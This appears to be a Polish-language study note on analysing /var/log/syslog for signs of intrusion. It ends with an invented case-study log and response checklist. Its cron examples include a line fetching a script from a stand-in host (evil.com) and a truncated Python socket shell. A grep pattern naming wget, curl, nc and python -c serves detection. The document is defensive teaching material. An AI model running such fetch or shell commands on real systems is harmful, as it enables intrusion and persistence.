# syslog_analysis

## Cel
Zrozumienie, jak czytać wpisy z pliku `/var/log/syslog` i interpretować ogólne logi systemowe. 

## Czym jest syslog
Jest to ogólny plik logów systemowych, zawierający komunikaty z:
- jądra (kernel),
- systemd (systemd[1]),
- usług (cron, sshd - część logów, nie wszystko),
- aplikacji (jeśli wysyłają logi do syslog).
To logi uzupełniające dla `auth.log`, znaleźć w nich można błędy systemowe, problemy z usługami, restarty, awarie sprzętu. 
- `auth.log` - zawiera tylko uwierzytelnianie (logowania, sudo, PAM, SSH) - to podstawa analizy ataków, 
- `syslog` - zawiera wszystko inne (jądro, usługi, aplikacje). 

## Struktura wpisu
Przykład:  
`Jun 7 10:00:00 server kernel: [12345] BUG: soft lockup - CPU#0 stuck for 23s`  
Wyjaśnienie:
- `Jun 7 10:00:00` - data i godzina, 
- `server` - nazwa hosta,
- `kernel:` - usługa, 
- `[12345] BUG: soft lockup...` - komunikat.

## kernel: - logi jądra
- `kernel panic` - system nagle przestał działać. Może to oznaczać atak np. crash systemu lub błąd sprzętu, 
- `BUG: soft lockup` - oznacza, że procesor "zawiesił się" na kilka sekund. Może oznaczać złośliwy kod (rootkit, minery),
- `Out of memory` - oznacza, że systemowi zabrakło pamięci. To może oznaczać atak DoS, wyciek pamięci, złośliwy proces, 
- `Unaligned access` - oznacza dostęp do pamięci bez wyrównania. To często błąd w kodzie, może być exploit.   
Jądro jest najniższą warstwą. Jeżeli ktoś modyfikuje jądro (rootkit) lub powoduje jego awarię, zostawia ślady w `kern.log` i w `syslog`. Atakujący może próbować ukryć swoje działania wywołując `kernel panic` i restart. W przypadku wystąpienia podejrzanych wpisów w logach kernel, dobrą praktyką jest sprawdzenie czy nie ma innych śladów jak podmiana jądra, `init=/bin/bash` (sposoby sprawdzenia podmiany jądra oraz modyfikacji GRUB, itp. znajdują się w pliku `00_system_overview/boot_process_basics`).

## systemd[1]: - logi systemd
- `Started evil.service` - czyli usługa o dziwnej nazwie (np. backdoor.service, update.service`) może oznaczać, że ktoś dodał własną usługę (persistence),
- `Stopped sshd.service` - zatrzymanie SSH może służyć do przeładowania zmodyfikowanej konfiguracji SSH lub przerwania istniejących połączeń, po takiej zmianie restart usługi jest konieczny by nowe ustawienia zaczęły funkcjonować,  
- `Failed to start mysql.service` - brak startu usługi, może być spowodowane atakiem (zmiana konfiguracji),
- `Reloaded nginx.service` - restart usługi jest podejrzany jeśli występuje o nietypowej porze (np. 03:00 w nocy).   
Systemd uruchamia usługi. Atakujący często dodaje własną usługę, żeby backdoor uruchamiał się przy starcie. W logach systemd można zobaczyć, że usługa została dodana, uruchomiona lub zatrzymana. W przypadku wystąpienia podejrzanego wpisu należy:
- sprawdzić jakie usługi są aktualnie uruchomione `systemctl list-unit-files --type=service --state=enabled`,
- przeszukać `/etc/systemd/system/` w celu znalezienia usług o podejrzanych nazwach, 
- sprawdzić, czy usługa nie uruchamia się z `/tmp` lub `/home` za pomocą polecenia `ls -la /proc/[PID]/exe`.

## cron[PID]: logi cron
- `(root) CMD (/tmp/.hidden/update)` - cron uruchamia skrypt z `/tmp`, to może oznaczać backdoor (persistence),
- `(jan) CMD (wget http://evil.com/script.sh` - pobranie skryptu przez cron - atakujący dodaje zadania do crontab użytkownika, 
- `(root) CMD (/usr/bin/python -c 'import socket...')` - podejrzane polecenie Pythona, może oznaczać shell w cronie.   
Cron uruchamia zadania cykliczne. Atakujący może dodać wpis do crontab, żeby backdoor uruchamiał się co minutę, codziennie o 3 nad ranem, itp. W takiej sytuacji należy:
- sprawdzić `crontab -l` dla roota i użytkowników, 
- sprawdzić `/etc/cron.d/`, `/etc/cron.daily/`, itp. 
- przeszukać `/tmp` i `/home/user` pod kątem niebezpiecznych skryptów. 

## error, fail, warning - ogólne błędy
- `sshd[1234]: error: PAM: authentication failure` - błędy PAM często występują przy brute force, to może oznaczać skanowanie haseł, 
- `sudo[4567]: user NOT in sudoers` - ktoś nieuprawniony próbował użyć `sudo` - oznacza próbę eskalacji,
- `su[5678]: pam_unix(su:auth): authentication failure` - oznacza, że ktoś próbował przełączyć się na roota lecz podał złe hasło, to może oznaczać próbę eskalacji.  
Ogólne błędy mogą wskazywać na problemy z konfiguracją, ale tez na próby ataku, np. gdy ktoś testuje hasła lub próbuje użyć sudo. W takiej sytuacji należy:
- sprawdzić `auth.log` - bo tam znajdują się szczegóły uwierzytelniania, 
- jeśli `auth.log` nie zawiera śladów, a `syslog` pokazuje błędy PAM, to może oznaczać, że logi zostały wyczyszczone. 

## Monitoring 
- `sudo grep -E "error|fail|warning" /var/log/syslog | tail -20` - sprawdzenie ostatnich 20 błędów, 
- `sudo grep -E "/tmp|/home" /var/log/syslog` - sprawdzenie podejrzanych lokalizacji,
- `sudo grep -E "wget|curl|nc|python -c" /var/log/syslog` - sprawdzenie podejrzanych poleceń, 
- `sudo grep "kernel" /var/log/syslog | grep -E "error|fail|panic|soft lockup"` - sprawdzenie błędów w logach jądra, 
- `sudo grep "systemd" /var/log/syslog | grep -E "Started|Stopped" | grep -v "Started Session"` - sprawdzenie nowych usług w systemd. 

## Case study 
Alert: "serwer produkcyjny (Ubuntu) działa wolno, kilkukrotnie przestał odpowiadać w ciągu ostatniej godziny". Zapis w logach `/var/log/syslog`:
```
Jun 7 02:30:01 server kernel: [12345] Out of memory: Kill process 9876 (evil) score 100 or sacrifice child  
Jun 7 02:31:15 server kernel: [12456] BUG: soft lockup - CPU stuck for 22s   
Jun 7 02:35:00 server systemd[1]: Started backdoor.service   
Jun 7 02:35:01 server systemd[1]: Started evil.timer  
Jun 7 02:36:00 server cron[1234]: (root) CMD (/tmp/.hidden/update)  
Jun 7 02:37:01 server kernel: [12556] Out of memory: Kill process 9988 (evil) score 100   
Jun 7 02:40:00 server systemd[1]: Stopped sshd.service  
Jun 7 02:41:00 server systemd[1]: Started sshd.service  
Jun 7 02:45:00 server kernel: Kernel panic - not syncing: Attempted to kill init!  
Jun 7 02:46:00 server systemd[1]: Reached target reboot
```

Analiza:  
W tych logach stało się wiele złych rzeczy, świadczy to o przeprowadzonym ataku, podczas którego atakujący dokonał wielu niebezpiecznych dla systemu zmian:
- `Kill process 9876 (evil) score 100 or sacrifice child` - oznacza to, że nastąpiło wyczerpanie pamięci, system zabił proces potomny procesu evil celem zwolnienia pamięci. Wszystko wskazuje, że atakujący przeprowadził atak DoS, 
- `BUG: soft lockup` - zawieszenie procesora na 22s, jest podejrzane i może wskazywać na rootkit, 
- `started backdoor.service, started evil.timer` - zostały uruchomione dwie podejrzane usługi, prawdopodobnie celem persistence, 
- `(root) CMD (/tmp/.hidden/update)` - cron uruchomił proces z niebezpiecznej lokalizacji (`/tmp`), prawdopodobnie atakujący chwilę wcześniej dodał plik do crontab, by zapewnić sobie dodatkowego backdoora, który będzie się uruchamiał automatycznie codziennie lub o określonych porach, 
- `Kill process 9988 (evil)` - system zabił proces evil celem zwolnienia pamięci, 
- `Started/Stopped sshd.service` - została zatrzymana a potem przywrócona usługa SSH. Zatrzymanie i uruchomienie SSH mogło służyć do przeładowania zmodyfikowanej konfiguracji (np. `sshd_config`) lub przerwania istniejących połączeń, 
- `Kernel panic - not syncing: Attempted to kill init!` - próba zabicia procesu init! [PID 1], jest to niemożliwe, więc system padł. To mogła być też próba restartu systemu bez użycia polecenia, które może być wyszukiwane przez reguły (np. reboot). Kolejna próba zatarcia śladów przez atakującego, 
- `Reached target reboot` - próba zrestartowania systemu po `kernel panic` została osiągnięta. Należy pamiętać, że przy atakach mających na celu podmianę jądra lub modyfikacji GRUB wymagają restartu systemu by dokończyć działanie.   
Zalecane działania:
- sprawdzić, czy backdoor wciąż działa za pomocą polecenia `systemctl status backdoor.service evil.timer`, `crontab -l`, 
- zabić podejrzane procesy za pomocą polecenia `kill -9`, zatrzymać podejrzane usługi `systemctl stop backdoor.service`, 
- usunąć skrypty z katalogu `/tmp`, sprawdzić również `/var/tmp` pod kątem podejrzanych skryptów, 
- sprawdzić logi `auth.log` by sprawdzić, które konto i z jakiego IP się logowało w czasie tego ataku, 
- sprawdzić, czy atakujący nie dodał nowego użytkownika, czy nie nadał uprawnień `sudo`, `su` dla jakiegoś konta, 
- sprawdzić, czy nie zostały dodane nowe klucze SSH (`authorized_keys`), 
- sprawdzić konfigurację SSH,
- sprawdzić czy GRUB, initramfs, nie zostały zmodyfikowane, 
- sprawdzić czy nie zostało podmienione jądro (logi wskazują taką możliwość), 
- przeprowadzić audyt systemu, zmienić hasła. 
To przykład jak wiele, w krótkim czasie może zrobić atakujący, w tym przypadku atakującemu zależało na utrzymaniu persistence, więc kompletny audyt systemu jest konieczny. 